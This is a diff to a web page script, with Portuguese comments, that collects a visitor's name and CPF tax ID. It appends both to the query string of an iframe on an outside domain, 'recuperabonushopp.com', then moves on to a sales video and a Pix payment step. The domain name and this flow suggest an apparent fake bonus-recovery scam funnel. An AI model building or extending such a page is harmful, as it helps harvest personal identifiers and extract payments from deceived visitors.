@@ -240,9 +240,15 @@
         });
 
         // 4. Confirmação -> VSL
+        // --- ATUALIZE ESSAS DUAS FUNÇÕES NO SEU SCRIPT ---
+
         function goToConfirm() {
-            let n = document.getElementById('input-nome').value, c = document.getElementById('input-chave').value;
-            if(n.length<3 || c.length<4) return alert("Preencha corretamente.");
+            let n = document.getElementById('input-nome').value;
+            let c = document.getElementById('input-chave').value; // Usando campo chave como CPF/ID
+            
+            // Validação simples
+            if(n.length < 3 || c.length < 3) return alert("Preencha os dados corretamente.");
+            
             document.getElementById('txt-nome').innerText = n;
             document.getElementById('txt-chave').innerText = c;
             
@@ -253,10 +259,25 @@
         }
 
         function goToVSL() {
+            // Pega os dados preenchidos
+            let nome = document.getElementById('input-nome').value;
+            let cpf = document.getElementById('input-chave').value.replace(/\D/g, ''); // Limpa o CPF
+            if(!cpf) cpf = "00000000000"; // Fallback
+
+            // Link original do Elementor
+            const baseURL = "https://recuperabonushopp.com/elementor-1623";
+            
+            // CRIA O LINK COM OS DADOS (A MÁGICA ACONTECE AQUI)
+            // Envia: ?nome=Cliente&cpf=123456
+            const finalURL = `${baseURL}?nome=${encodeURIComponent(nome)}&cpf=${cpf}`;
+
+            // Atualiza o Iframe com o link novo contendo os dados
+            document.querySelector('.vsl-frame').src = finalURL;
+
+            // Mostra a tela
             document.getElementById('screen-confirm').classList.add('hidden');
             document.getElementById('screen-vsl').classList.remove('hidden');
         }
-
         // 5. Gerar Pix (Backend)
         async function gerarPixAPI() {
             let btn = document.getElementById('btn-final');
